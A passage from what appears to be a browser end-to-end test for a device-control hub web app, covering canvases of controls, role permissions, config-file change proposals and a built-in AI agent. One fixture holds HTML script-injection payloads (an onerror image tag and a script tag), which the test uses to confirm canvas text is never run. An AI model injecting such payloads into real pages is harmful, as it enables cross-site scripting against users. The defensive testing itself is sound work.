        lamp_id = next(d["id"] for d in everything["drivers"] if d["name"] == "Stage lamp")
        given = await admin("/admin/api/screen/connections", {"id": "canvas", "drivers": ["sim-console", "sim-switch", lamp_id], "confirm": OWNER_PIN})
        check("Canvas can be given any kind of device", given.get("ok") is True, json.dumps(given))
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#shelf .item", has_text="Stage lamp").wait_for(timeout=10000)
        offered = await cv.locator("#shelf .item b").all_inner_texts()
        check("with no canvas yet, Canvas offers ones to start from, for the devices it was given", offered == ["An empty canvas", "My ears", "Channel strips", "Power and lights", "Stage lamp"], str(offered))
        if shots: await owner.screenshot(path=f"{shots}/10-canvas-start.png")
        await cv.locator("#shelf .item", has_text="Stage lamp").get_by_role("button", name="Add").click()
        await cv.locator("#pages button").first.wait_for(timeout=8000)
        tabs = await cv.locator("#pages button").all_inner_texts()
        check("a device's ready-made buttons become a canvas, a page for each group", tabs == ["Levels", "Power"] and await cv.locator("#name").inner_text() == "Stage lamp", str(tabs))
        await cv.locator("#board button.piece", has_text="Full brightness").wait_for(timeout=8000)
        check("its buttons take their words from the device", await cv.locator("#board button.piece").all_inner_texts() == ["Full brightness", "Half brightness"], str(await cv.locator("#board button.piece").all_inner_texts()))
        await cv.locator("#pages button", has_text="Power").click()
        await cv.locator("#board button.piece", has_text="Lamp off").click()
        for _ in range(40):
            if (await state(lamp_id)).get("generic/reading/power") == "off": break
            await owner.wait_for_timeout(100)
        await cv.locator("#board button.piece", has_text="Lamp on").click()
        for _ in range(40):
            if (await state(lamp_id)).get("generic/reading/power") == "on": break
            await owner.wait_for_timeout(100)
        check("pressing one does what the device's author set it up to do", (await state(lamp_id)).get("generic/reading/power") == "on", json.dumps(await state(lamp_id))[:200])

        # Canvases written straight into the config folder, the way an agent would write them.
        await owner.goto(base + "/admin/hub"); await owner.wait_for_selector("#secConfig:not([hidden]) #configTrust")
        canvas_dir = os.path.join(re.search(r"in (.+)/devices\.", await owner.locator("#configWhere").inner_text()).group(1), "screens", "canvas")
        fixtures = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "fixtures", "canvas")
        for name in ["switcher", "run-sheet"]:
            with open(os.path.join(fixtures, name + ".json")) as src, open(os.path.join(canvas_dir, name + ".json"), "w") as dst: dst.write(src.read())
        with open(os.path.join(canvas_dir, "broken.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "Half written", "pages": [{"name": "One", "pieces": [{"type": "slider", "at": [1, 1], "key": "level"}]}]}, f)
        with open(os.path.join(canvas_dir, "words.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "<img src=x onerror=parent.postMessage({type:'set'},'*')>", "pages": [{"name": "<b>One</b>", "pieces": [{"type": "label", "at": [1, 1, 4, 1], "text": "<script>document.title='run'</script><img src=x>"}, {"type": "label", "at": [1, 2, 4, 1], "text": "second"}]}]}, f)
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#pick option").nth(4).wait_for(state="attached", timeout=8000)
        names = await cv.locator("#pick option").all_inner_texts()
        check("canvases written as files are there beside the one made on the page", names == ["<img src=x onerror=parent.postMessage({type:'set'},'*')>", "Half written", "Run sheet", "Stage lamp", "Switcher"], str(names))
        await cv.locator("#pick").select_option("words"); await cv.locator("#board .label").first.wait_for()
        check("every word of a canvas is shown as words and never run", await cv.locator("#board img, #board script, #pick img").count() == 0 and "<script>" in await cv.locator("#board .label").first.inner_text() and await next(f for f in owner.frames if "/screens/canvas/" in f.url).title() == "Skillfully: canvas")
        await cv.locator("#pick").select_option("broken"); await cv.locator("#blank li").first.wait_for()
        told = await cv.locator("#blank").inner_text()
        check("a canvas that cannot be drawn says which file and what is wrong with it", "This canvas cannot be drawn" in told and "broken.json" in told and "Page 1, piece 1 (slider)" in told and "needs a key such as" in told, told)
        # From here, note every value the hub sends this screen.
        canvas_frame = next(f for f in owner.frames if "/screens/canvas/" in f.url)
        await canvas_frame.evaluate("() => { window.heard = []; addEventListener('message', (e) => { if (e.data && e.data.type === 'state') window.heard.push(...Object.keys(e.data.values)); }); }")
        await cv.locator("#pick").select_option("switcher"); await cv.locator("#board button.piece", has_text="Outlet 3").wait_for(timeout=8000)
        await owner.wait_for_timeout(300)
        heard = await canvas_frame.evaluate("() => window.heard")
        check("a canvas tells the hub which values it is showing, and is sent those and no others", 8 <= len(set(heard)) <= 16 and all(k.startswith(("switch/outlet/", "generic/")) for k in heard), f"{len(set(heard))} values: {sorted(set(heard))[:6]}")

        # --- A slider tied to an action that takes a number: done once, when it is let go ---
        with open(os.path.join(canvas_dir, "lamp-level.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "Lamp level", "pages": [{"name": "One", "pieces": [
                {"type": "readout", "at": [1, 1, 4, 1], "key": "generic/reading/level", "device": lamp_id, "title": "Level now"},
                {"type": "slider", "at": [1, 2, 4, 1], "key": "generic/action/level", "device": lamp_id, "sends": "level", "min": 0, "max": 100, "shows": {"key": "generic/reading/level"}, "title": "Level"}]}]}, f)
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#pick option", has_text="Lamp level").wait_for(state="attached", timeout=8000)
        await cv.locator("#pick").select_option("lamp-level")
        knob = cv.locator("#board .slider")
        await knob.wait_for()
        now = cv.locator("#board .readout .num")
        await owner.wait_for_timeout(800)
        was = (await now.inner_text()).strip()
        check("a slider tied to an action rests where the device says the thing is", was not in ("", "—") and await knob.get_attribute("aria-valuenow") == was, f"{await knob.get_attribute('aria-valuenow')} {await now.inner_text()}")
        box = await knob.locator(".track").bounding_box()
        await owner.mouse.move(box["x"] + box["width"] * 0.1, box["y"] + box["height"] / 2)
        await owner.mouse.down()
        for part in (0.25, 0.5, 0.7, 0.8):
            await owner.mouse.move(box["x"] + box["width"] * part, box["y"] + box["height"] / 2)
            await owner.wait_for_timeout(120)
        await owner.wait_for_timeout(500)
        check("while it is being moved, nothing is sent: the device is where it was", (await now.inner_text()).strip() == was and (await knob.get_attribute("aria-valuenow")) not in ("30", None), f"{await now.inner_text()} {await knob.get_attribute('aria-valuenow')}")
        await owner.mouse.up()
        for _ in range(60):
            if (await now.inner_text()).strip() == "80": break
            await owner.wait_for_timeout(100)
        check("let go, the action is done once with the number it was let go at", (await now.inner_text()).strip() == "80" and await knob.get_attribute("aria-valuenow") == "80", f"{await now.inner_text()} {await knob.get_attribute('aria-valuenow')}")
        if shots: await owner.screenshot(path=f"{shots}/12-canvas-action-slider.png")

        # --- On a wide screen a canvas uses the room there is ---
        narrow = (await cv.locator("#board").bounding_box())["width"]
        await owner.set_viewport_size({"width": 1440, "height": 900})
        await owner.wait_for_timeout(400)
        wide = (await cv.locator("#board").bounding_box())["width"]
        check("on a computer's screen a canvas is drawn larger, not as a strip down the middle", wide > 800 and narrow < 420, f"{narrow} then {wide}")
        if shots: await owner.screenshot(path=f"{shots}/13-canvas-wide.png")
        box = await knob.locator(".track").bounding_box()
        await owner.mouse.move(box["x"] + box["width"] * 0.8, box["y"] + box["height"] / 2)
        await owner.mouse.down()
        await owner.mouse.move(box["x"] + box["width"] * 0.5, box["y"] + box["height"] / 2)
        await owner.wait_for_timeout(150)
        await owner.mouse.up()
        for _ in range(60):
            if (await now.inner_text()).strip() == "50": break
            await owner.wait_for_timeout(100)
        check("and drawn larger, a slider still lands where the pointer let it go", (await now.inner_text()).strip() == "50", await now.inner_text())
        await owner.set_viewport_size({"width": 390, "height": 844})
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#pick option").nth(4).wait_for(state="attached", timeout=8000)
        await cv.locator("#pick").select_option("switcher"); await cv.locator("#board button.piece", has_text="Outlet 3").wait_for(timeout=8000)
        canvas_frame = next(f for f in owner.frames if "/screens/canvas/" in f.url)
        lamp_on = cv.locator("#board button.piece", has_text="Lamp on")
        check("a button is lit by a reading of its device", "lit" in await lamp_on.get_attribute("class") and "lit" not in await cv.locator("#board button.piece", has_text="Lamp off").get_attribute("class"), await lamp_on.get_attribute("class"))
        three = cv.locator("#board button.piece", has_text="Outlet 3")
        was = "lit" in await three.get_attribute("class")
        await three.click()
        await cv.locator("#board button.piece.lit", has_text="Outlet 3").wait_for(timeout=5000)
        check("a repeated row of buttons: the one pressed turns the outlet on and lights up", not was and (await state("sim-switch"))["switch/outlet/3/on"] is True)
        if shots: await owner.screenshot(path=f"{shots}/10b-canvas-switcher.png")
        await cv.locator("#pick").select_option("run-sheet"); await cv.locator("#board .clock .num").wait_for()
        check("one canvas holds pieces of several devices, and a clock", re.match(r"^\d{1,2}:\d\d:\d\d", await cv.locator("#board .clock .num").inner_text()) is not None and await cv.locator("#board .readout .num").inner_text() == "on" and await cv.locator("#board button.piece[aria-pressed]").count() == 2, await cv.locator("#board").inner_text())
        house = cv.locator("#board .slider", has_text="House lights")
        box = await house.locator(".track").bounding_box()
        await owner.mouse.move(box["x"] + box["width"] * .9, box["y"] + 4); await owner.mouse.down()
        await owner.mouse.move(box["x"] + box["width"] * .3, box["y"] + 4, steps=6); await owner.mouse.up()
        for _ in range(40):
            if abs((await state("sim-switch"))["switch/outlet/2/brightness"] - 30) <= 3: break
            await owner.wait_for_timeout(100)
        dim = (await state("sim-switch"))["switch/outlet/2/brightness"]
        check("a slider lying down sets the brightness it is dragged to", abs(dim - 30) <= 3 and await house.locator(".num").inner_text() == f"{round(dim)}%", f"{dim} {await house.locator('.num').inner_text()}")
        if shots: await owner.screenshot(path=f"{shots}/10c-canvas-run-sheet.png")
        # The owner adds the ear-mix canvas. Nobody has set the owner's own ears, and it says so.
        await cv.locator("#more").click()
        await cv.locator("#shelf .item", has_text="My ears").get_by_role("button", name="Add").click()
        await cv.locator("#board .slider").first.wait_for(timeout=8000)
        check("a piece that needs something nobody has set for you says so, and sends nothing", await cv.locator("#board .slider.off").count() == 8 and "Not set for you" in await cv.locator("#board .slider").first.inner_text(), await cv.locator("#board .slider").first.inner_text())

        # A canvas of nothing but words is for everyone, so the test's one is taken away again before Sam looks.
        os.remove(os.path.join(canvas_dir, "words.json"))
        # Sam is given the two abilities about Sam's own ears, on Canvas. The same canvas is now Sam's own mix.
        musician = next(r for r in everything["roles"] if r["name"] == "Musician")
        saved = await admin("/admin/api/role", {"role": {**musician, "grants": {**musician["grants"], "canvas": ["see-my-ears", "adjust-my-ears"]}}})
        check("a role can be given part of Canvas", saved.get("ok") is True, json.dumps(saved)[:200])
        # Sam was turned off earlier. The owner turns Sam back on, and Sam signs in again.
        await admin("/admin/api/person/disabled", {"id": sam_id, "disabled": False})
        await pg.goto(base + "/signin"); await pg.fill("#name", "Sam"); await pg.fill("#secret", SAM_PIN); await pg.click("#go")
        await pg.wait_for_url("**/s/one-fader")
        await pg.goto(base + "/s/canvas")
        sv = pg.frame_locator("#screen")
        await sv.locator("#board .slider").first.wait_for(timeout=10000)
        check("Sam is shown the one canvas with anything of Sam's on it, and no way to add, arrange or remove one", await sv.locator("#name").inner_text() == "My ears" and not await sv.locator("#pick").is_visible() and not await sv.locator("#more").is_visible() and not await sv.locator("#arrange").is_visible(), await sv.locator("header").inner_text())
        strips = await sv.locator("#board .slider .name").all_inner_texts()
        check("each strip takes its name from the board", len(strips) == 8 and strips[1] == (await state("sim-console"))["console/input/2/name"], str(strips))
        two = sv.locator("#board .slider").nth(1)
        box = await two.locator(".track").bounding_box()
        await pg.mouse.move(box["x"] + 4, box["y"] + box["height"] * .5); await pg.mouse.down()
        await pg.mouse.move(box["x"] + 4, box["y"] + box["height"] * .2, steps=8); await pg.mouse.up()
        # The board ends up where the thumb was let go, and the strip shows what the board holds.
        words = lambda v: ("+" if v > 0 else "") + f"{v:.1f}"
        for _ in range(40):
            level = (await state("sim-console"))["console/input/2/bus/1/level"]
            if level > -90 and await two.locator(".num").inner_text() == words(level): break
            await pg.wait_for_timeout(100)
        check("dragging a strip moves that input in Sam's own bus on the board", -20 < level < 5 and await two.locator(".num").inner_text() == words(level), f"{level} {await two.locator('.num').inner_text()}")
        if shots: await pg.screenshot(path=f"{shots}/10d-canvas-sam.png")
        sf = next(f for f in pg.frames if "/screens/canvas/" in f.url)
        ack = await sf.evaluate(ASK, ["sim-console", "console/input/2/bus/5/level", 0])
        check("whatever a canvas has on it, Sam's reach stops at Sam's own bus", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        ack = await sf.evaluate(ASK, ["sim-switch", "switch/outlet/1/on", True])
        check("and Sam cannot flip a switch through Canvas", ack.get("ok") is False and (await state("sim-switch"))["switch/outlet/1/on"] is False, json.dumps(ack))
        kept = await sf.evaluate("""() => new Promise((res) => {
          addEventListener("message", (e) => { if (e.data.type === "doc-ack" && e.data.ref === "probe-doc") res(e.data); });
          parent.postMessage({ type: "doc-put", id: "my-ears", doc: { kind: "canvas", name: "Sam's", pages: [] }, ref: "probe-doc" }, "*");
          setTimeout(() => res({ timeout: true }), 1500);
        })""")
        check("or change a canvas", kept.get("ok") is False, json.dumps(kept))
        probes = await sf.evaluate(PROBES)
        check("Canvas is held to the same sandbox as every screen", all(v == "blocked" for k, v in probes.items() if k != "origin") and probes["origin"] == "null", json.dumps(probes))
        await pg.goto(base + "/s/one-fader")

        # --- Arranging a canvas on the screen: choose, drag, size, add, and nothing is kept until Done ---
        def on_disk(name):
            with open(os.path.join(canvas_dir, name + ".json")) as f: return json.load(f)
        async def cells(locator):
            return await locator.evaluate("(e) => [e.style.gridColumn, e.style.gridRow].join(' | ')")
        await cv.locator("#pick").select_option("run-sheet"); await cv.locator("#board .clock .num").wait_for()
        before = on_disk("run-sheet")
        await cv.locator("#arrange").click(); await cv.locator("#board .cell").first.wait_for()
        check("arranging shows the grid, and a bar with what can be done", await cv.locator("#bar #done").is_visible() and await cv.locator("#bar #undo").is_disabled() and not await cv.locator("#pick").is_visible())
        outlet = (await state("sim-switch"))["switch/outlet/1/on"]
        one = cv.locator("#board .slot", has=cv.locator("button[aria-pressed]")).first
        await one.click(); await cv.locator("#panel h2", has_text="Toggle").wait_for()
        await owner.wait_for_timeout(300)
        check("while arranging, touching a piece chooses it and does not use it", (await state("sim-switch"))["switch/outlet/1/on"] is outlet and await cv.locator("#setKey").input_value() == "switch/outlet/1/on")
        back = cv.locator("#board .slot", has_text="Band back")
        await back.click(); await cv.locator("#panel h2", has_text="Button").wait_for(); await owner.wait_for_timeout(700)
        was = await cells(back)
        box = await back.bounding_box()
        await owner.mouse.move(box["x"] + 30, box["y"] + 30); await owner.mouse.down()
        await owner.mouse.move(box["x"] + 30, box["y"] + 30 + 68 * 2, steps=6); await owner.mouse.up()
        await owner.wait_for_timeout(300)
        check("dragging the chosen piece moves it by whole cells", [was, await cells(back)] == ["3 / span 2 | 6 / span 1", "3 / span 2 | 8 / span 1"], f"{was} -> {await cells(back)}")
        await cv.locator("#undo").click()
        check("Undo puts it back", await cells(back) == was and await cv.locator("#undo").is_disabled(), await cells(back))
        await back.click(); await owner.wait_for_timeout(700)
        grip = await cv.locator("#board .slot.sel .grip").bounding_box(); wide = (await back.bounding_box())["width"]
        await owner.mouse.move(grip["x"] + 10, grip["y"] + 10); await owner.mouse.down()
        await owner.mouse.move(grip["x"] + 10 - wide / 2, grip["y"] + 10 + 68, steps=6); await owner.mouse.up()
        await owner.wait_for_timeout(300)
        check("dragging its corner sizes it", await cells(back) == "3 / span 1 | 6 / span 2", await cells(back))
        await back.focus(); await owner.keyboard.press("ArrowLeft"); await owner.wait_for_timeout(200)
        check("and the arrow keys move it too", await cells(cv.locator("#board .slot", has_text="Band back")) == "2 / span 1 | 6 / span 2", await cells(cv.locator("#board .slot", has_text="Band back")))
        check("two pieces left on the same cell are marked, so it is seen before it is kept", await cv.locator("#board .slot.clash").count() == 2, str(await cv.locator("#board .slot.clash").count()))
        # A new piece is tied to something by choosing from what the devices have.
        await cv.locator("#addPiece").select_option("slider"); await cv.locator("#pickFind").wait_for()
        await cv.locator("#pickFind").fill("input 3 bus 2 level")
        found = await cv.locator("#pickList .pick").all_inner_texts()
        check("adding a piece asks what to tie it to, from what the screen's devices have", len(found) == 1 and "Send level, input 3, bus 2" in found[0] and "console/input/3/bus/2/level" in found[0], str(found[:3]))
        await cv.locator("#pickList .pick").first.click(); await cv.locator("#panel h2", has_text="Slider").wait_for()
        check("the new piece is on the canvas, chosen, in the first place it fits", await cv.locator("#setKey").input_value() == "console/input/3/bus/2/level" and await cv.locator("#board .slot.sel .slider").count() == 1)
        check("nothing has reached the hub yet", on_disk("run-sheet") == before)
        if shots: await owner.screenshot(path=f"{shots}/11-canvas-arranging.png")
        await cv.locator("#done").click(); await cv.locator("#arrange").wait_for()
        after = on_disk("run-sheet")["pages"][0]["pieces"]
        check("Done keeps the canvas, as the same kind of file anyone could have written", [p["at"] for p in after if p.get("title") == "Band back"] == [[2, 6, 1, 2]] and any(p.get("key") == "console/input/3/bus/2/level" and p["type"] == "slider" for p in after) and len(after) == len(before["pages"][0]["pieces"]) + 1, json.dumps(after)[-400:])
        await cv.locator("#board .slider", has_text="Send level").wait_for(timeout=8000)
        check("and the canvas is in use again, with the new piece on it", not await cv.locator("#bar").is_visible() and await cv.locator("#board .cell").count() == 0)
        # Cancel loses what was done, after asking once.
        await cv.locator("#arrange").click(); await cv.locator("#board .cell").first.wait_for()
        await cv.locator("#board .slot", has_text="Band back").click(); await cv.locator("#removePiece").click()
        await cv.locator("#cancel").click()
        check("Cancel asks before losing changes", await cv.locator("#cancel").inner_text() == "Lose changes?" and await cv.locator("#bar").is_visible())
        await cv.locator("#cancel").click(); await cv.locator("#arrange").wait_for()
        check("and then nothing is kept", on_disk("run-sheet")["pages"][0]["pieces"] == after and await cv.locator("#board button.piece", has_text="Band back").count() == 1)
        # A canvas from nothing: named, a group that repeats, and a second page.
        await cv.locator("#more").click(); await cv.locator("#startEmpty").click(); await cv.locator("#setName").wait_for()
        await cv.locator("#setName").fill("Video desk"); await cv.locator("#setName").blur()
        await cv.locator("#addPiece").select_option("button"); await cv.locator("#pickFind").fill("outlet 1 on")
        await cv.locator("#pickList .pick").first.click(); await cv.locator("#groupPiece").click()
        await cv.locator("#panel .field", has_text="Repeats").locator("select").select_option("range")
        await cv.locator("#setTo").fill("4"); await cv.locator("#setTo").blur()
        await cv.locator("#board .slot[data-path^='1/1']").nth(1).click(); await cv.locator("#panel h2", has_text="Button").wait_for()
        await cv.locator("#panel .parts select").first.select_option("{n}")
        await cv.locator("#panel .field", has_text="Name").get_by_role("button", name="From a value").click()
        await cv.locator("#pickFind").fill("outlet name 1"); await cv.locator("#pickList .pick").first.click()
        await cv.locator("#panel .parts select").nth(1).select_option("{n}") if await cv.locator("#panel .parts select").count() > 1 else None
        await cv.locator("#addPage").click(); await cv.locator("#setPage").fill("Lamp"); await cv.locator("#setPage").blur()
        await cv.locator("#addPiece").select_option("clock")
        if shots: await owner.screenshot(path=f"{shots}/11b-canvas-new.png")
        await cv.locator("#done").click(); await cv.locator("#arrange").wait_for()
        made = on_disk("video-desk")
        row = made["pages"][0]["pieces"][0]
        check("a new canvas is kept under a file name made from its name", made["name"] == "Video desk" and [p["name"] for p in made["pages"]] == ["Page 1", "Lamp"] and made["pages"][1]["pieces"][0]["type"] == "clock", json.dumps(made)[:300])
        check("a piece put in a group and repeated is written once, with the item's name in its key", row["type"] == "group" and row["repeat"] == {"as": "n", "from": 1, "to": 4} and row["pieces"][0]["key"] == "switch/outlet/{n}/on", json.dumps(row))
        await cv.locator("#board button.piece").nth(3).wait_for(timeout=8000)
        check("and it is drawn four times, opened as soon as it is kept", await cv.locator("#board button.piece").count() == 4 and await cv.locator("#pick").input_value() == "video-desk", str(await cv.locator("#board button.piece").all_inner_texts()))

        # --- Someone who can only write files proposes a change. The hub does what is safe, and asks about the rest ---
        await owner.goto(base + "/admin/hub"); await owner.wait_for_selector("#secConfig:not([hidden]) #configTrust")
        folder = re.search(r"in (.+)/devices\.", await owner.locator("#configWhere").inner_text()).group(1)
        check("a hub starts out strict about what files may do", "Strict." in await owner.locator("#configTrust").inner_text())
        path = os.path.join(folder, "devices", "sim-switch.json")
        with open(path) as f: device = json.load(f)
        check("the file says what the hub holds, and no more", device["control"] is True and device["name"] == "Simulated switch", str(device))
        device["control"] = False
        device["reach"]["allowed"] = device["reach"]["allowed"] + ["10.0.0.7:9000"]
        with open(path, "w") as f: json.dump(device, f)
        await owner.goto(base + "/admin")
        await owner.locator("#needs .need", has_text="Files in the config folder propose 2 changes. 1 needs your yes.").wait_for(timeout=20000)
        check("Home says the files propose something, and how much of it needs a yes", True)
        await owner.locator("#needs .need", has_text="config folder").locator("a.open").click()
        await owner.wait_for_selector("#configList .change")
        told = await owner.locator("#configList").inner_text()
        check("the Hub place says each change in words, and which one waits", "Stop people controlling Simulated switch" in told and "Let Simulated switch: Reach the device at 10.0.0.7, port 9000" in told and told.count("Waits for your yes") == 1 and told.count("Done when you apply") == 1, told)
        if shots: await owner.screenshot(path=f"{shots}/9-config-proposed.png", full_page=True)
        await owner.click("#configApply")
        asked = await owner.locator("#dlgBody").inner_text()
        check("applying shows what will be done, and it is only the change that hands out nothing", "Stop people controlling Simulated switch" in asked and "10.0.0.7" not in asked, asked)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => document.querySelectorAll('#configList .change').length === 1")
        drivers = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["drivers"]
        switch = next(d for d in drivers if d["id"] == "sim-switch")
        check("what was safe is done, and what hands out power is not", switch["mode"] == "listen" and not any("10.0.0.7" in g["words"] for g in switch["grants"]), str(switch["grants"]))
        await owner.locator("#configList .change").get_by_role("button", name="Say yes").click()
        check("saying yes shows exactly what is being said yes to", "Reach the device at 10.0.0.7, port 9000" in await owner.locator("#dlgBody").inner_text())
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#configList .status.ok", has_text="The files say the same as the hub.").wait_for(timeout=15000)
        drivers = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["drivers"]
        switch = next(d for d in drivers if d["id"] == "sim-switch")
        check("after the yes, the device holds it", any("10.0.0.7" in g["words"] for g in switch["grants"]), str(switch["grants"]))
        await owner.locator("#configTrust").get_by_role("button", name="Change").click()
        await owner.locator("#dlgBody label.check", has_text="Trusting for an hour").locator("input").check()
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#configTrust", has_text="Strict again in 60 minutes").wait_for(timeout=10000)
        check("trusting can be turned on for an hour, and the page says when it ends", "Trusting." in await owner.locator("#configTrust").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/9b-config-trusting.png", full_page=True)

        # --- The agent: someone on the team who is not a person ---
        secret_key = "sk-browser-test-key-123456"
        async def ok_dialog():
            await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.goto(base + "/admin/hub"); await owner.wait_for_selector("#agentMake")
        check("the Hub place says what an agent is before there is one", "someone on the team who is not a person" in await owner.locator("#secAgent").inner_text())
        await owner.click("#agentMake"); await owner.fill("#agentName", "Robin"); await ok_dialog()
        await owner.wait_for_selector("#agentStatus")
        told = await owner.locator("#secAgent").inner_text()
        check("made, it is off with no roles and no key, says so, and cannot be turned on yet", "Off." in told and "It has no roles yet" in told and "No key yet" in told and await owner.locator("#agentTurn").is_disabled(), told)
        await owner.click("#agentKeySet"); await owner.fill("#agentKey", secret_key); await ok_dialog()
        await owner.wait_for_function("() => document.querySelector('#secAgent').innerText.includes('A key is set')")
        everything = await (await owner_ctx.request.get(base + "/admin/api/all")).text()
        check("its key is kept and never shown again: not on the page, and not in what the page is told", secret_key not in await owner.content() and secret_key not in everything and '"keySet":true' in everything)
        await owner.click("#agentTurn"); await ok_dialog()
        await owner.locator("#agentStatus", has_text="On.").wait_for(timeout=8000)
        check("with a key it can be turned on, after a yes", True)
        if shots: await owner.screenshot(path=f"{shots}/12-agent.png", full_page=True)
        await place("People"); await owner.wait_for_selector("#people .item")
        robin = owner.locator("#people .item", has=owner.locator("h3", has_text="Robin"))
        check("under People it is one of the team, marked as the agent, with roles to give and no way to sign in", "Agent" in await robin.inner_text() and await robin.get_by_role("button", name="Roles").count() == 1 and await robin.get_by_role("button", name="Invite").count() == 0 and await robin.get_by_role("button", name="Reset sign-in").count() == 0, await robin.inner_text())

        # --- Asking it something. It thinks with a pretend model on this computer. ---
        model = f"http://127.0.0.1:{os.environ.get('MODEL_PORT', '7009')}"
        heard = lambda: json.loads(urllib.request.build_opener(urllib.request.ProxyHandler({})).open(model + "/heard").read())
        await place("Hub"); await owner.wait_for_selector("#agentStatus")
        told = await owner.locator("#secAgent").inner_text()
        check("on, it can be asked something, and the card says it can see no devices yet and how to change that", await owner.locator("#agentAsk").is_visible() and "No devices. Give it a role" in told, told)
        await owner.click("#agentModelSet"); await owner.fill("#agentAddress", model); await ok_dialog()
        await owner.wait_for_function("(m) => document.querySelector('#secAgent').innerText.includes(m.replace('http://', ''))", arg=model)
        await owner.fill("#agentQuestion", "Is anything not working?"); await owner.click("#agentAskGo")
        await owner.locator("#agentSaid.said").wait_for(timeout=15000)
        check("with no roles it looks, sees nothing, and says so", await owner.locator("#agentSaid").inner_text() == "I cannot see any devices yet." and "Listed the devices: none in reach" in await owner.locator("#agentLooked").inner_text(), await owner.locator("#agentAnswer").inner_text())
        # Given a musician's role, it sees what a musician with no mix of their own sees: the names on the board.
        await place("People"); await owner.wait_for_selector("#people .item")
        await robin.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Musician").locator("input").check()
        await ok_dialog()
        await place("Hub"); await owner.locator("#secAgent", has_text="What it can see").wait_for()
        await owner.wait_for_function("() => /What it can see\\s+Simulated board\\./.test(document.querySelector('#secAgent').innerText)")
        check("given a role, the card names the devices it can now see", True)
        await owner.fill("#agentQuestion", "Is anything not working?"); await owner.press("#agentQuestion", "Enter")
        await owner.locator("#agentSaid.said", has_text="Simulated board").wait_for(timeout=15000)
        answer = await owner.locator("#agentAnswer").inner_text()
        check("asked again, it answers from what it can see, and the page says what it looked at and what that cost", "I can see Simulated board (48 values). Nothing looks wrong." in answer and "Listed the devices: Simulated board" in answer and "Its model was asked 2 times, using 1,880 tokens." in answer, answer)
        await owner.fill("#agentQuestion", "And now?")
        await owner.wait_for_timeout(4600)
        check("the answer and a question being typed stay put while the page keeps itself current", "Nothing looks wrong." in await owner.locator("#agentSaid").inner_text() and await owner.input_value("#agentQuestion") == "And now?")
        h = heard()
        check("its model heard the key in the one place it belongs, and no person's name at all", h["asked"] == 4 and set(h["keys"]) == {secret_key} and secret_key not in h["text"] and "Sam" not in h["text"] and "Evan" not in h["text"], str(h["keys"]))
        if shots: await owner.screenshot(path=f"{shots}/13-agent-asked.png", full_page=True)

        # --- Which version this is ---
        await place("Hub"); await owner.wait_for_selector("#version .item")
        check("the Hub place says which version is running, and a hub run from its source says it is not updated by a button", "started from its source" in await owner.locator("#secVersion").inner_text() and await owner.locator("#versionGo").count() == 0)

        # --- Choosing its model from what its key can use ---
        await place("Hub"); await owner.wait_for_selector("#agentModelSet")
        await owner.click("#agentModelSet")
        await owner.locator("#agentModel option", has_text="Pretend Large 2 (pretend-large-2)").wait_for(state="attached", timeout=8000)
        options = await owner.locator("#agentModel option").all_inner_texts()
        check("the model is chosen from a list the hub asked the model's service for, with the one in use kept in it", options == ["claude-sonnet-5-5 (in use now)", "Pretend Large 2 (pretend-large-2)", "Pretend Small 2 (pretend-small-2)", "Another model"] and await owner.locator("#agentModelOther").is_hidden(), str(options))
        check("choosing a model asks for no PIN, and changing where the key is sent does", await owner.locator("#confirm").count() == 0)
        if shots: await owner.screenshot(path=f"{shots}/13b-agent-model.png")
        await owner.select_option("#agentModel", "pretend-small-2")
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => document.querySelector('#secAgent').innerText.includes('pretend-small-2, at')")
        check("the chosen model is the agent's model", True)
        await owner.click("#agentModelSet")
        await owner.locator("#agentModel option", has_text="Pretend Large 2").wait_for(state="attached", timeout=8000)
        await owner.select_option("#agentModel", label="Another model")
        await owner.fill("#agentModelOther", "claude-sonnet-5-5")
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => document.querySelector('#secAgent').innerText.includes('claude-sonnet-5-5, at')")
        check("a model that is not in the list can still be typed", True)

        # --- Talking to it, on a screen of its own ---
        await owner.goto(base + "/s/ask")
        ask = owner.frame_locator("#screen")
        await ask.locator("#name", has_text="Ask Robin").wait_for(timeout=8000)
        check("the Ask screen names the agent, says what it answers from, and offers a place to start", "Answers from what you can see" in await ask.locator("#linkText").inner_text() and await ask.locator(".start button").count() == 2 and await ask.locator("#fresh").is_hidden())
        if shots: await owner.screenshot(path=f"{shots}/14-ask-empty.png")
        await ask.locator("#q").fill("Is anything not working?"); await ask.locator("#q").press("Enter")
        await ask.locator(".theirs", has_text="Nothing looks wrong.").wait_for(timeout=15000)
        await ask.locator("#send", has_text="Ask").wait_for()
        said = await ask.locator("#talk").inner_text()
        check("asked, the question, what it looked at and its answer are shown in order, and the box is cleared", said.index("Is anything not working?") < said.index("Listed the devices: Simulated board") < said.index("I can see Simulated board (48 values). Nothing looks wrong.") and await ask.locator("#q").input_value() == "" and await ask.locator(".waiting").count() == 0, said)
        check("what the agent says is shown as words and never run", await ask.locator("#talk img, #talk script, #talk a").count() == 0)
        if shots: await owner.screenshot(path=f"{shots}/15-ask.png")
        await owner.reload()
        ask = owner.frame_locator("#screen")
